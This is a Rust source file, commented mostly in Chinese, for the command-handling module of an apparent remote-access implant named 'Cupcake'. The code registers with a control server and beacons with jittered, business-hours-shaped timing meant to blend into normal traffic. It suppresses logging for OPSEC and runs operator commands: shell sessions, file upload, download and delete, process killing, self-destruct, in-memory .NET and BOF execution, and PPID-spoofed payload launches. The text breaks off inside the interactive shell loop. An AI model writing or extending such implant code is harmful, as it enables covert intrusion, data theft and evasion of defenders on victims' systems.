// 消息处理模块
//
// 负责处理传输层消息的接收、解析和响应。
// 实现完整的消息循环：注册 → 监听命令 → 执行 → 响应。
// 
// 协议无关设计：通过 Transport trait 与传输层交互，
// 不依赖任何具体的传输协议实现。

use crate::error::{ClientError, Result};
#[cfg(feature = "post-ex")]
use crate::executor::CommandExecutor;
use crate::transport::Transport;
use crate::types::{CommandPayload, CommandResult, MessageType, MessageWrapper, SystemInfo};
use log::{debug, error, info, warn};
use futures_util::future::{BoxFuture, FutureExt};
use base64::Engine;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

/// Stage0: command needs L2 module not yet loaded.
#[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
fn stage0_module_required(command_type: &str) -> CommandResult {
    let msg = match crate::module_loader::ensure_module_for_command(command_type) {
        Err(e) => e,
        Ok(()) => format!("module_required:{} (loaded but no handler path)", command_type),
    };
    CommandResult {
        stdout: String::new(),
        stderr: msg,
        path: None,
        req_id: None,
    }
}

/// Stage0: run shell via loaded mod_shell (or report module_required).
#[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
fn stage0_shell(command: &str) -> CommandResult {
    match crate::module_loader::invoke_shell(command) {
        Ok(r) => r,
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: e,
            path: None,
            req_id: None,
        },
    }
}

/// Stage0: stage+load CKMS module package (base64 in data, id in path or content).
#[cfg(feature = "module-loader")]
fn stage0_module_stage(payload: &crate::types::CommandPayload) -> CommandResult {
    let id = payload
        .path
        .as_deref()
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| {
            let c = payload.command_content.trim();
            if c.is_empty() {
                "shell"
            } else {
                c
            }
        });
    let raw = payload.data.as_deref().unwrap_or("").trim();
    if raw.is_empty() {
        return CommandResult {
            stdout: String::new(),
            stderr: "module_stage: missing data (base64 CKMS blob)".into(),
            path: None,
            req_id: None,
        };
    }
    match crate::module_loader::handle_module_stage(id, raw.as_bytes(), true) {
        Ok(msg) => CommandResult {
            stdout: msg,
            stderr: String::new(),
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: e,
            path: None,
            req_id: None,
        },
    }
}

/// Stage0: unload module by id.
#[cfg(feature = "module-loader")]
fn stage0_module_unload(payload: &crate::types::CommandPayload) -> CommandResult {
    let id = payload.command_content.trim();
    if id.is_empty() {
        return CommandResult {
            stdout: String::new(),
            stderr: "module_unload: missing id".into(),
            path: None,
            req_id: None,
        };
    }
    match crate::module_loader::registry().unload(id) {
        Ok(()) => CommandResult {
            stdout: format!("unloaded {id}"),
            stderr: String::new(),
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: e,
            path: None,
            req_id: None,
        },
    }
}

/// 消息处理器
/// 
/// 负责处理与服务端的所有消息交互，包括：
/// - 发送注册消息
/// - 接收和解析命令消息
/// - 执行命令
/// - 发送响应消息
/// 
/// # 设计原则
/// 
/// - 协议无关：只依赖 Transport trait，不关心底层是 WebSocket、DNS 还是其他协议
/// - 错误恢复：单个消息处理失败不会导致连接断开
/// - 资源管理：拥有 Transport 的所有权，可以在需要时返还给调用者
pub struct MessageHandler {
    /// 传输层（trait object）
    transport: Box<dyn Transport>,
}

impl MessageHandler {
    /// 创建新的消息处理器
    /// 
    /// # 参数
    /// 
    /// * `transport` - 实现了 Transport trait 的传输层
    pub fn new(transport: Box<dyn Transport>) -> Self {
        Self { transport }
    }
    
    /// 运行消息处理循环
    /// 
    /// 该方法会：
    /// 1. 发送注册消息
    /// 2. 进入无限循环接收和处理消息
    /// 3. 如果连接断开或发生错误，返回 transport 以便外层重连
    /// 
    /// # 返回值
    /// 
    /// - `Ok(transport)`: 正常退出，返回 transport 供重连使用
    /// - `Err(e)`: 发生错误，transport 已失效
    pub async fn run(mut self) -> std::result::Result<Box<dyn Transport>, ClientError> {
        crate::utils::db_print("[Cupcake] MessageHandler.run() started.");

        crate::utils::db_print("[Cupcake] register() started...");
        if let Err(e) = self.register().await {
            crate::utils::db_print(&format!("[Cupcake] register() FAILED: {:?}", e));
            return Err(e);
        }
        crate::utils::db_print("[Cupcake] register() successful.");

        // 🛡️ Phase 3: Adaptive Heartbeat with Gaussian Jitter
        let base_interval = crate::config::get_heartbeat_interval();
        let base_interval_secs = if base_interval == 0 { 30 } else { base_interval };

        // Adaptive multiplier: doubles when idle, halves when active
        let mut idle_multiplier: u64 = 1;
        let mut consecutive_idle_count: u32 = 0;
        let max_idle_multiplier = 4; // Max 4x base interval when idle

        loop {
            // 🚀 Phase 3: Gaussian distribution jitter (not uniform)
            // Using Box-Muller transform approximation for Gaussian distribution
            let mean = base_interval_secs * idle_multiplier;
            let std_dev = mean / 4; // Standard deviation = 25% of mean

            // Generate Gaussian random value using Box-Muller approximation
            let u1 = crate::utils::next_u32() as f64 / 4294967295.0;
            let u2 = crate::utils::next_u32() as f64 / 4294967295.0;

            // Box-Muller: z = sqrt(-2 * ln(u1)) * cos(2 * pi * u2)
            let gaussian = if u1 > 0.0 {
                let z = (-2.0 * u1.ln()).sqrt() * (2.0 * std::f64::consts::PI * u2).cos();
                z * std_dev as f64 + mean as f64
            } else {
                mean as f64
            };

            // Clamp to reasonable range (at least 10 seconds, max 2 hours)
            let final_delay = gaussian.max(10.0).min(7200.0) as u64;

            crate::utils::db_print(&format!(
                "[Cupcake] Adaptive heartbeat: {}s (base: {}s, idle multiplier: {}x)",
                final_delay, base_interval_secs, idle_multiplier
            ));

            let received_data = tokio::select! {
                data_res = self.transport.receive() => {
                    match data_res {
                        Ok(data) => {
                            let d: Vec<u8> = data;
                            if d.is_empty() {
                                // Connection closed
                                return Ok(self.transport);
                            }

                            // 🚀 Phase 3: Activity detected - reset idle multiplier
                            idle_multiplier = 1;
                            consecutive_idle_count = 0;

                            if let Err(e) = self.handle_message(&d).await {
                                if let ClientError::ConnectionError(_) = e {
                                    return Ok(self.transport);
                                }
                                continue;
                            }
                            true // Received data
                        }
                        Err(_) => {
                            return Ok(self.transport);
                        }
                    }
                }
                _ = crate::stealth::stealth_sleep(final_delay as u32 * 1000) => {
                    // 🚀 Phase 3: Idle period - increment idle multiplier
                    consecutive_idle_count += 1;

                    // Double interval after 3 consecutive idle heartbeats
                    if consecutive_idle_count >= 3 && idle_multiplier < max_idle_multiplier {
                        idle_multiplier *= 2;
                        consecutive_idle_count = 0;
                        crate::utils::db_print(&format!(
                            "[Cupcake] Network idle detected, increasing heartbeat interval to {}x",
                            idle_multiplier
                        ));
                    }

                    // Send heartbeat
                    let heartbeat_res = CommandResult {
                        stdout: String::new(),
                        stderr: String::new(),
                        path: None,
                        req_id: Some("heartbeat".to_string()),
                    };

                    if let Err(_) = self.send_message(&heartbeat_res.to_response_message()).await {
                        return Ok(self.transport);
                    }
                    false // No data received
                }
            };

            // Optional: Sync heartbeat during office hours (9am-6pm local time)
            // This makes traffic look more like legitimate business activity
            if !received_data {
                let hour = chrono_like_now();

                // During office hours (9-18), use shorter intervals
                if hour >= 9 && hour < 18 && idle_multiplier > 1 {
                    idle_multiplier = idle_multiplier.max(2); // Cap at 2x during work hours
                }
            }
        }
    }

    /// 发送注册消息
    /// 
    /// 收集系统信息并发送注册消息到服务端。
    async fn register(&mut self) -> Result<()> {
        crate::utils::db_print("[Cupcake] register() started...");
        // 收集系统信息
        let sys_info = SystemInfo::collect();
        crate::utils::db_print("[Cupcake] SystemInfo collected.");
        
        // 初始化传输层（某些协议如 DNS 需要 UUID）
        self.transport.initialize(&sys_info.uuid);
        
        // 构造注册消息
        let register_msg = sys_info.to_register_message();
        crate::utils::db_print("[Cupcake] Sending Register message...");
        
        // 发送注册消息
        self.send_message(&register_msg).await?;
        crate::utils::db_print("[Cupcake] Register message sent.");
        
        Ok(())
    }
    
    /// 处理接收到的消息
    /// 
    /// 解析 JSON 消息并根据消息类型进行相应的处理。
    async fn handle_message(&mut self, data: &[u8]) -> Result<()> {
        // 将字节数据转换为字符串
        let text = String::from_utf8(data.to_vec())
            .map_err(|e| ClientError::ConnectionError(
                format!("Invalid UTF-8 in received message: {}", e)
            ))?;
        
        // ⚡ OPSEC: 不要在控制台打印收到的完整协议内容
        // trace!("Received message: {}", text);
        
        // 反序列化消息
        let wrapper: MessageWrapper = match serde_json::from_str(&text) {
            Ok(w) => w,
            Err(e) => {
                error!("Failed to deserialize message: {}", e);
                return Err(ClientError::SerializationError(e));
            }
        };
        
        // 根据消息类型处理
        match wrapper.msg_type {
            MessageType::Command => {
                self.handle_command(wrapper).await?;
            }
            MessageType::Register => {
                warn!("Received unexpected Register message from server");
            }
            MessageType::Response => {
                warn!("Received unexpected Response message from server");
            }
        }
        
        Ok(())
    }
    
    /// 处理命令消息
    /// 
    /// 解析命令、执行命令、发送响应。
    /// 支持的命令类型：
    /// - shell: 执行 shell 命令
    /// - file_ls: 列出目录文件
    /// - file_upload: 上传文件
    /// - file_download: 下载文件
    /// - process_list: 列出系统进程
    /// - process_kill: 终止指定进程
    pub fn handle_command<'a>(&'a mut self, wrapper: MessageWrapper) -> BoxFuture<'a, Result<()>> {
        async move {
        // 解析命令载荷
        let command_payload: CommandPayload = match serde_json::from_value(wrapper.payload) {
            Ok(p) => p,
            Err(e) => {
                error!("Failed to parse command payload: {}", e);
                return Err(ClientError::SerializationError(e));
            }
        };
        
        // 提取 req_id 以便在响应中回显
        let req_id = command_payload.req_id.clone();
        
        // 根据命令类型执行不同的操作
        let mut result = match command_payload.command_type.as_str() {
            "shell" => {
                let clean_cmd = command_payload.command_content.trim();
                if clean_cmd.is_empty() || clean_cmd.starts_with('{') {
                    debug!("Silently dropping heartbeat/control message: {}", command_payload.command_content);
                    return Ok(());
                }
                #[cfg(feature = "post-ex")]
                {
                    CommandExecutor::execute(clean_cmd).await
                }
                #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
                {
                    stage0_shell(clean_cmd)
                }
                #[cfg(all(not(feature = "post-ex"), not(feature = "module-loader")))]
                {
                    let _ = clean_cmd;
                    CommandResult {
                        stdout: String::new(),
                        stderr: "shell unavailable (no post-ex / module-loader)".into(),
                        path: None,
                        req_id: None,
                    }
                }
            }
            // L2 module management (Stage0 + legacy with module-loader)
            #[cfg(feature = "module-loader")]
            "module_stage" | "module_push" | "module_load" => {
                stage0_module_stage(&command_payload)
            }
            #[cfg(feature = "module-loader")]
            "module_unload" => stage0_module_unload(&command_payload),
            #[cfg(feature = "module-loader")]
            "module_list" => {
                let list = crate::module_loader::registry().list_loaded();
                CommandResult {
                    stdout: list.join(","),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                }
            },
            "shell_interactive" => {
                // Legacy monolith: interactive session (may still use hybrid/PTY elsewhere).
                // Stage0/beacon: NEVER spawn cmd.exe/bash here — require mod_shell.
                #[cfg(feature = "post-ex")]
                {
                    self.start_interactive_shell(req_id.clone()).await
                }
                #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
                {
                    let _ = req_id;
                    // Fail closed: no cmd.exe/bash in Stage0. Absent → module_required:shell.
                    // Loaded → one-shot shell path only (interactive stream stays L2/post-ex).
                    match crate::module_loader::ensure_module_for_command("shell_interactive") {
                        Err(e) => CommandResult {
                            stdout: String::new(),
                            stderr: e,
                            path: None,
                            req_id: None,
                        },
                        Ok(()) => CommandResult {
                            stdout: String::new(),
                            stderr: "shell_interactive not on Stage0; use command_type=shell via mod_shell"
                                .into(),
                            path: None,
                            req_id: None,
                        },
                    }
                }
                #[cfg(all(not(feature = "post-ex"), not(feature = "module-loader")))]
                {
                    let _ = req_id;
                    CommandResult {
                        stdout: String::new(),
                        stderr: "shell_interactive unavailable (no post-ex / module-loader)".into(),
                        path: None,
                        req_id: None,
                    }
                }
            }


            // --- File commands: post-ex only ---
            #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
            "file_ls" | "file_upload" | "file_upload_chunk" | "file_download"
            | "file_download_chunk" | "file_delete" | "file_mkdir" => {
                stage0_module_required("file_list")
            }
            #[cfg(all(not(feature = "post-ex"), not(feature = "module-loader")))]
            "file_ls" | "file_upload" | "file_upload_chunk" | "file_download"
            | "file_download_chunk" | "file_delete" | "file_mkdir" => CommandResult {
                stdout: String::new(),
                stderr: "file ops unavailable".into(),
                path: None,
                req_id: None,
            },

            #[cfg(feature = "post-ex")]
            "file_ls" => {
                let target_path = command_payload
                    .path
                    .as_deref()
                    .unwrap_or(command_payload.command_content.as_str());
                let resolved_path = crate::fs::resolve_path(target_path).ok();
                match crate::fs::ls(target_path) {
                    Ok(json) => CommandResult {
                        stdout: json,
                        stderr: String::new(),
                        path: resolved_path,
                        req_id: None,
                    },
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to list directory: {}", e),
                        path: None,
                        req_id: None,
                    },
                }
            }
            #[cfg(feature = "post-ex")]
            "file_upload" => {
                if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
                    if path.trim().is_empty() || data.trim().is_empty() {
                        CommandResult {
                            stdout: String::new(),
                            stderr: "Invalid file_upload params".to_string(),
                            path: None,
                            req_id: None,
                        }
                    } else {
                        match crate::fs::upload(path, data) {
                            Ok(_) => CommandResult {
                                stdout: format!("File uploaded successfully: {}", path),
                                stderr: String::new(),
                                path: None,
                                req_id: None,
                            },
                            Err(e) => CommandResult {
                                stdout: String::new(),
                                stderr: format!("Failed to upload file: {}", e),
                                path: None,
                                req_id: None,
                            },
                        }
                    }
                } else {
                    CommandResult {
                        stdout: String::new(),
                        stderr: "Missing file_upload params (path or data)".to_string(),
                        path: None,
                        req_id: None,
                    }
                }
            }
            #[cfg(feature = "post-ex")]
            "file_upload_chunk" => {
                if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
                    let is_append = serde_json::from_str::<serde_json::Value>(&command_payload.command_content)
                        .ok()
                        .and_then(|v| v.get("is_append")?.as_bool())
                        .unwrap_or(false);
                    match crate::fs::upload_chunk(path, data, is_append) {
                        Ok(_) => CommandResult {
                            stdout: format!("Chunk uploaded: {}", path),
                            stderr: String::new(),
                            path: None,
                            req_id: None,
                        },
                        Err(e) => CommandResult {
                            stdout: String::new(),
                            stderr: format!("Failed to upload chunk: {}", e),
                            path: None,
                            req_id: None,
                        },
                    }
                } else {
                    CommandResult {
                        stdout: String::new(),
                        stderr: "Invalid file_upload_chunk params".to_string(),
                        path: None,
                        req_id: None,
                    }
                }
            }
            #[cfg(feature = "post-ex")]
            "file_download" => {
                let target_path = command_payload
                    .path
                    .as_deref()
                    .unwrap_or(command_payload.command_content.as_str());
                match crate::fs::download(target_path) {
                    Ok(base64_data) => CommandResult {
                        stdout: base64_data,
                        stderr: String::new(),
                        path: None,
                        req_id: None,
                    },
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to download file: {}", e),
                        path: None,
                        req_id: None,
                    },
                }
            }
            #[cfg(feature = "post-ex")]
            "file_download_chunk" => {
                let target_path = command_payload.path.as_deref()
                    .unwrap_or_else(|| {
                        let parts: Vec<&str> = command_payload.command_content.split('|').collect();
                        if parts.len() > 2 { parts[2] } else { command_payload.command_content.as_str() }
                    });
                
                let mut offset = 0u64;
                let mut size = 2 * 1024 * 1024;
                
                if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&command_payload.command_content) {
                    offset = parsed.get("offset").and_then(|v| v.as_u64()).unwrap_or(0);
                    size = parsed.get("size").and_then(|v| v.as_u64()).unwrap_or(2 * 1024 * 1024) as usize;
                }
                
                match crate::fs::download_chunk(target_path, offset, size) {
                    Ok((base64_data, is_eof)) => {
                        let result_json = serde_json::json!({
                            "data": base64_data,
                            "is_eof": is_eof,
                            "offset": offset
                        });
                        CommandResult {
                            stdout: result_json.to_string(),
                            stderr: String::new(),
                            path: None,
                            req_id: None,
                        }
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to download chunk: {}", e),
                        path: None,
                        req_id: None,
                    }
                }
            }
            #[cfg(feature = "post-ex")]
            "file_delete" => {
                if let Ok(paths) = serde_json::from_str::<Vec<String>>(&command_payload.command_content) {
                    let mut results = Vec::new();
                    let mut errors = Vec::new();
                    for p in paths {
                        match crate::fs::remove(&p) {
                            Ok(_) => results.push(p),
                            Err(e) => errors.push(format!("{}: {}", p, e)),
                        }
                    }
                    CommandResult {
                        stdout: format!("Batch deleted: {}", results.join(", ")),
                        stderr: if errors.is_empty() { String::new() } else { errors.join("; ") },
                        path: None,
                        req_id: None,
                    }
                } else {
                    let target_path = command_payload
                        .path
                        .as_deref()
                        .unwrap_or(command_payload.command_content.as_str());
                    if target_path.trim().is_empty() {
                        CommandResult {
                            stdout: String::new(),
                            stderr: "Delete path is empty".to_string(),
                            path: None,
                            req_id: None,
                        }
                    } else {
                        match crate::fs::remove(target_path) {
                            Ok(_) => CommandResult {
                                stdout: format!("Deleted: {}", target_path),
                                stderr: String::new(),
                                path: None,
                                req_id: None,
                            },
                            Err(e) => CommandResult {
                                stdout: String::new(),
                                stderr: format!("Failed to delete: {}", e),
                                path: None,
                                req_id: None,
                            },
                        }
                    }
                }
            }
            #[cfg(feature = "post-ex")]
            "process_list" => Self::process_list().await,
            #[cfg(feature = "post-ex")]
            "process_kill" => {
                let pid = command_payload.command_content.trim();
                Self::process_kill(pid).await
            }
            #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
            "process_list" | "process_kill" => stage0_module_required("process_list"),
            #[cfg(all(not(feature = "post-ex"), not(feature = "module-loader")))]
            "process_list" | "process_kill" => CommandResult {
                stdout: String::new(),
                stderr: "process ops unavailable".into(),
                path: None,
                req_id: None,
            },

            "self_destruct" => {
                crate::utils::self_destruct().await
            }
            // PPID-isolated .NET host when isolated-exec is on
            #[cfg(feature = "isolated-exec")]
            "execute_assembly" => {
                let assembly = command_payload
                    .data
                    .as_deref()
                    .and_then(|d| base64::engine::general_purpose::STANDARD.decode(d.trim()).ok());
                match assembly {
                    Some(bytes) => {
                        let args: Vec<String> = command_payload
                            .command_content
                            .split_whitespace()
                            .map(|s| s.to_string())
                            .collect();
                        let mut r =
                            crate::isolated_exec::run_dotnet_isolated(&bytes, &args).await;
                        r.req_id = command_payload.req_id.clone();
                        r
                    }
                    None => CommandResult {
                        stdout: String::new(),
                        stderr: "execute_assembly: missing base64 data (stage iso_host if missing)"
                            .into(),
                        path: None,
                        req_id: command_payload.req_id.clone(),
                    },
                }
            }
            // In-process .NET when isolated-exec off
            #[cfg(all(feature = "plugin", feature = "dotnet", not(feature = "isolated-exec")))]
            "execute_assembly" => {
                let assembly_data = if let Some(d) = command_payload.data.as_deref() {
                    base64::engine::general_purpose::STANDARD.decode(d.trim()).ok()
                } else {
                    None
                };

                match crate::plugin_router::PluginRouter::parse_plugin_task(
                    "execute-assembly",
                    &command_payload.command_content,
                    command_payload.req_id.clone(),
                ) {
                    Ok(mut task) => {
                        if let Some(data) = assembly_data {
                            task.data = data;
                        }
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    },
                }
            }
            #[cfg(feature = "plugin")]
            "plugin_cache" => {
                let plugin_id = command_payload.command_content.trim().to_string();
                let b64_data = command_payload.data.as_deref().unwrap_or("");

                if plugin_id.is_empty() || b64_data.is_empty() {
                    CommandResult {
                        stdout: String::new(),
                        stderr: "Invalid plugin_cache params: missing ID or data".to_string(),
                        path: None,
                        req_id: command_payload.req_id.clone(),
                    }
                } else {
                    match base64::engine::general_purpose::STANDARD.decode(b64_data.trim()) {
                        Ok(bin) => {
                            crate::plugin_router::PluginRouter::cache_plugin(plugin_id.clone(), bin);
                            CommandResult {
                                stdout: format!("Successfully cached plugin: {}", plugin_id),
                                stderr: String::new(),
                                path: None,
                                req_id: command_payload.req_id.clone(),
                            }
                        }
                        Err(e) => CommandResult {
                            stdout: String::new(),
                            stderr: format!("Failed to decode plugin data: {}", e),
                            path: None,
                            req_id: command_payload.req_id.clone(),
                        },
                    }
                }
            }

            // Native PE tools (fscan etc.) — PPID-spoofed short process, not shell spawn
            #[cfg(feature = "isolated-exec")]
            "native_exec" => {
                let args = command_payload.command_content.trim();
                let pe = command_payload
                    .data
                    .as_deref()
                    .and_then(|d| base64::engine::general_purpose::STANDARD.decode(d.trim()).ok());
                match pe {
                    Some(bytes) => {
                        let mut r =
                            crate::isolated_exec::run_native_isolated(&bytes, args).await;
                        r.req_id = command_payload.req_id.clone();
                        r
                    }
                    None => CommandResult {
                        stdout: String::new(),
                        stderr: "native_exec: missing base64 PE data".into(),
                        path: None,
                        req_id: command_payload.req_id.clone(),
                    },
                }
            }
            // PPID-isolated sacrificial host (preferred when isolated-exec is on)
            #[cfg(feature = "isolated-exec")]
            "bof_exec" => {
                let content = command_payload.command_content.trim();
                let bof_b64 = command_payload.data.as_deref().unwrap_or("");
                match base64::engine::general_purpose::STANDARD.decode(bof_b64.trim()) {
                    Ok(bytes) => {
                        let arg_bytes = base64::engine::general_purpose::STANDARD
                            .decode(content)
                            .unwrap_or_default();
                        let mut r =
                            crate::isolated_exec::run_bof_isolated(&bytes, &arg_bytes).await;
                        r.req_id = command_payload.req_id.clone();
                        r
                    }
                    Err(_) => CommandResult {
                        stdout: String::new(),
                        stderr: "bof_exec: bad base64 (stage iso_host PE if missing)".into(),
                        path: None,
                        req_id: command_payload.req_id.clone(),
                    },
                }
            }
            // In-process BOF only when isolated-exec is off
            #[cfg(all(feature = "bof", not(feature = "isolated-exec")))]
            "bof_exec" => {
                let content = command_payload.command_content.trim();
                let bof_bytes = if content.starts_with("cached:") {
                    let id = content[7..].split('|').next().unwrap_or("");
                    #[cfg(feature = "plugin")]
                    {
                        crate::plugin_router::PluginRouter::get_cached_plugin(id)
                    }
                    #[cfg(not(feature = "plugin"))]
                    {
                        let _ = id;
                        None
                    }
                } else {
                    let bof_b64 = command_payload.data.as_deref().unwrap_or("");
                    base64::engine::general_purpose::STANDARD
                        .decode(bof_b64.trim())
                        .ok()
                };

                match bof_bytes {
                    Some(bytes) => {
                        let (final_bytes, arg_bytes) = if content.starts_with("cached:") {
                            let parts: Vec<&str> = content[7..].splitn(2, '|').collect();
                            let args = if parts.len() > 1 {
                                base64::engine::general_purpose::STANDARD
                                    .decode(parts[1])
                                    .unwrap_or_default()
                            } else {
                                vec![]
                            };
                            (bytes, args)
                        } else {
                            let args = base64::engine::general_purpose::STANDARD
                                .decode(content)
                                .unwrap_or_default();
                            (bytes, args)
                        };

                        #[cfg(all(feature = "bof", target_os = "windows"))]
                        match crate::loader::bof::BofLoader::execute(&final_bytes, &arg_bytes).await
                        {
                            Ok(output) => CommandResult {
                                stdout: output,
                                stderr: String::new(),
                                path: None,
                                req_id: command_payload.req_id.clone(),
                            },
                            Err(e) => CommandResult {
                                stdout: String::new(),
                                stderr: format!("BOF execution failed: {}", e),
                                path: None,
                                req_id: command_payload.req_id.clone(),
                            },
                        }
                        #[cfg(not(all(feature = "bof", target_os = "windows")))]
                        {
                            let _ = (final_bytes, arg_bytes);
                            CommandResult {
                                stdout: String::new(),
                                stderr: "BOF execution is only supported on Windows".to_string(),
                                path: None,
                                req_id: command_payload.req_id.clone(),
                            }
                        }
                    }
                    None => CommandResult {
                        stdout: String::new(),
                        stderr: "Failed to obtain BOF data (not in cache and no data provided)"
                            .to_string(),
                        path: None,
                        req_id: command_payload.req_id.clone(),
                    },
                }
            }

            _ => {
                warn!(
                    "Unsupported command type: {}, ignoring",
                    command_payload.command_type
                );
                return Ok(());
            }
        };
        
        // 将 req_id 回显到响应中
        result.req_id = req_id;
        
        // 构造响应消息
        let response_msg = result.to_response_message();
        
        // 发送响应
        self.send_message(&response_msg).await?;
        
        Ok(())
        }.boxed()
    }
    
    /// 列出系统进程 (Windows: NtQuerySystemInformation / Linux: /proc)
    #[cfg(feature = "post-ex")]
    async fn process_list() -> CommandResult {
        let mut processes = Vec::new();

        #[cfg(target_os = "windows")]
        {
            match crate::native::list_processes() {
                Ok(list) => {
                    for p in list {
                        processes.push(serde_json::json!({
                            "pid": p.pid,
                            "ppid": p.ppid,
                            "name": p.name,
                            "user": "",
                            "path": "",
                            "arch": "x64",
                        }));
                    }
                }
                Err(e) => {
                    return CommandResult {
                        stdout: "[]".to_string(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    };
                }
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            if let Ok(entries) = std::fs::read_dir("/proc") {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if let Some(pid_str) = path.file_name().and_then(|s| s.to_str()) {
                        if pid_str.chars().all(|c| c.is_digit(10)) {
                            let name = std::fs::read_to_string(path.join("comm")).unwrap_or_default().trim().to_string();
                            let status = std::fs::read_to_string(path.join("status")).unwrap_or_default();
                            let ppid = status.lines()
                                .find(|l| l.starts_with("PPid:"))
                                .and_then(|l| l.split_whitespace().nth(1))
                                .and_then(|s| s.parse::<u32>().ok())
                                .unwrap_or(0);

                            processes.push(serde_json::json!({
                                "pid": pid_str.parse::<u32>().unwrap_or(0),
                                "ppid": ppid,
                                "name": name,
                                "user": "",
                                "path": format!("/proc/{}", pid_str),
                                "arch": "x64",
                            }));
                        }
                    }
                }
            }
        }

        match serde_json::to_string(&processes) {
            Ok(json) => CommandResult { stdout: json, stderr: String::new(), path: None, req_id: None },
            Err(e) => CommandResult { stdout: "[]".to_string(), stderr: e.to_string(), path: None, req_id: None },
        }
    }

    /// 终止指定进程 (Windows: NtOpenProcess + NtTerminateProcess)
    #[cfg(feature = "post-ex")]
    async fn process_kill(pid_str: &str) -> CommandResult {
        let pid_u32 = match pid_str.parse::<u32>() {
            Ok(p) => p,
            Err(_) => return CommandResult { stdout: String::new(), stderr: "Invalid PID".to_string(), path: None, req_id: None },
        };

        #[cfg(target_os = "windows")]
        {
            return match crate::native::terminate_process(pid_u32) {
                Ok(()) => CommandResult {
                    stdout: format!("Killed PID {}", pid_u32),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                },
                Err(e) => CommandResult {
                    stdout: String::new(),
                    stderr: e,
                    path: None,
                    req_id: None,
                },
            };
        }

        #[cfg(not(target_os = "windows"))]
        {
            if unsafe { libc::kill(pid_u32 as i32, 9) } == 0 {
                return CommandResult {
                    stdout: format!("Killed PID {}", pid_u32),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                };
            }
            CommandResult {
                stdout: String::new(),
                stderr: "Failed to kill process".to_string(),
                path: None,
                req_id: None,
            }
        }
    }
    
    /// 发送消息到服务端
    /// 
    /// 将消息序列化为 JSON 并通过传输层发送。
    async fn send_message(&mut self, msg: &MessageWrapper) -> Result<()> {
        // 序列化消息
        let json = serde_json::to_string(msg)?;
        
        // ⚡ OPSEC: 移除发送内容的明文打印
        // trace!("Sending message: {}", json); 
        
        // 通过传输层发送
        self.transport.send(json.as_bytes()).await?;
        
        Ok(())
    }

    #[cfg(target_os = "windows")]
    fn decode_windows_output(bytes: &[u8]) -> String {
        if let Ok(text) = std::str::from_utf8(bytes) {
            return text.to_string();
        }
        #[cfg(feature = "encoding-support")]
        {
            let (decoded_cow, _encoding_used, _had_errors) = encoding_rs::GBK.decode(bytes);
            return decoded_cow.to_string();
        }
        #[cfg(not(feature = "encoding-support"))]
        {
            String::from_utf8_lossy(bytes).into_owned()
        }
    }
    
    /// 启动交互式 shell 会话（仅 post-ex / legacy monolith）。
    ///
    /// Stage0 (`beacon`) 不得编译此路径：禁止在 L1 内直接 spawn cmd.exe / bash。
    /// Stage0 交互作业通过 `mod_shell` 的 one-shot `shell` 命令完成。
    #[cfg(feature = "post-ex")]
    fn start_interactive_shell<'a>(&'a mut self, req_id: Option<String>) -> BoxFuture<'a, CommandResult> {
        async move {
        info!("Starting interactive shell session");
        
        #[cfg(target_os = "windows")]
        let mut child = {
            let mut cmd = tokio::process::Command::new("cmd");
            cmd.arg("/Q");
            cmd.creation_flags(0x08000000 | 0x00000008); // CREATE_NO_WINDOW | DETACHED_PROCESS
            cmd.stdin(std::process::Stdio::piped());
            cmd.stdout(std::process::Stdio::piped());
            cmd.stderr(std::process::Stdio::piped());
            cmd.kill_on_drop(true);
            match cmd.spawn() {
                Ok(child) => child,
                Err(e) => {
                    error!("Failed to spawn cmd.exe: {}", e);
                    return CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to start interactive shell: {}", e),
                        path: None,
                        req_id: req_id.clone(),
                    };
                }
            }
        };
        
        #[cfg(not(target_os = "windows"))]
        let mut child = match tokio::process::Command::new("/bin/bash")
            .args(&["-i"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true)
            .spawn()
        {
            Ok(child) => child,
            Err(e) => {
                error!("Failed to spawn bash: {}", e);
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to start interactive shell: {}", e),
                    path: None,
                    req_id: req_id.clone(),
                };
            }
        };
        
        let mut stdin = child.stdin.take().expect("Failed to get stdin");
        let mut stdout = child.stdout.take().expect("Failed to get stdout");
        let mut stderr = child.stderr.take().expect("Failed to get stderr");
        
        info!("Interactive shell started, entering message loop");
        
        // 进入交互式消息循环 - 这里实现了 bug 报告中提到的修复
        loop {
            tokio::select! {
                // 从传输层接收消息
                transport_result = self.transport.receive() => {
                    match transport_result {
                        Ok(data_vec) => {
                            let data: &[u8] = data_vec.as_ref();
                            if data.is_empty() {
                                warn!("Connection closed by server");
                                break;
                            }
                            
                            // 将字节数据转换为字符串
                            let text = match String::from_utf8(data.to_vec()) {
                                Ok(t) => t,
                                Err(_) => {
                                    debug!("Received non-UTF8 data, ignoring");
                                    continue;
                                }
                            };
                            
                            // 🛡️ FIX: 忽略空字符串或只包含空白字符的字符串（心跳）
